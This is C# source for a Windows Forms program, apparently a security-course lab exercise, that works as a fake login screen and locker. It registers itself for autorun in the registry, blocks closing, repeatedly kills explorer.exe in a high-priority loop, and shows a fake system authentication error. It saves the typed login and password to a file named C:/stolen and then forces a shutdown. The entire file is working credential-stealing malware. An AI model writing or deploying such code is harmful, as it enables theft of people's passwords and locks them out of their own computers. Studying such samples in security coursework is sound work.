using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace oib_lab_11
{
    public partial class Form1 : Form
    {
        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
            e.Cancel = true;
        }

        private void expLock()
        {
            Thread block_exp = new Thread(new ThreadStart(KillExp));
            block_exp.Priority = ThreadPriority.Highest;
            block_exp.IsBackground = false;
            block_exp.Start();
        }

        public void KillExp()
        {
            while (true)
            {
                System.Diagnostics.Process[] process = System.Diagnostics.Process.GetProcessesByName("explorer");
                if (process != null)
                {
                    try
                    {
                        foreach (var p in process)
                            p.Kill();
                    }
                    catch (Exception) { }
                }
            }
        }

        public void set_autorun()
        {
            RegistryKey autorun_key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            autorun_key.SetValue("some_name", Application.ExecutablePath);
            autorun_key.Close();
        }

        public RegistryKey get_key()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("virus_check", true);
            if (key == null)
            {
                key = Registry.CurrentUser.CreateSubKey("virus_check");
            }
            return key;
        }

        public Form1()
        {
            set_autorun();
            RegistryKey key = get_key();
            var odd_obj = key.GetValue("odd", 0);
            if (odd_obj != null && Convert.ToString(odd_obj) == "0")
            {
                key.SetValue("odd", "1", RegistryValueKind.String);
                key.Close();
                expLock();
                MessageBox.Show("Windows system auth error", "Auth error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                InitializeComponent();
            }
            else
            {
                key.SetValue("odd", "0", RegistryValueKind.String);
                key.Close();
                Application.Exit();
                this.Close();
            }
        }

        private void shutdown()
        {
            System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");
        }

        private void Off_Click(object sender, EventArgs e)
        {
            shutdown();
        }

        private void save()
        {
            FileStream fs = new FileStream("C:/stolen", FileMode.Create, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.WriteLine("Login was: " + loginField.Text + "\nPassword was: " + passField.Text);
            fs.Close();
            sw.Close();
        }

        private void input_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrWhiteSpace(loginField.Text) || String.IsNullOrWhiteSpace(passField.Text))
            {
                label3.Text = "Login or password field is empty";
            }
            else
            {
                if (loginField.Text.Length < 3 || passField.Text.Length < 8)
                {
                    label3.Text = "Login or password is not above the minimum size";
                }
                else
                {
                    DialogResult Dialog = DialogResult.None;
                    Dialog = MessageBox.Show("Wrong login or password. Try again.", "System error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    if (Dialog == DialogResult.OK)
                    {
                        save();
                        shutdown();
                    }
                }
            }
        }

        private void show_Click(object sender, EventArgs e)
        {
            passField.UseSystemPasswordChar = !passField.UseSystemPasswordChar;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

    }
}
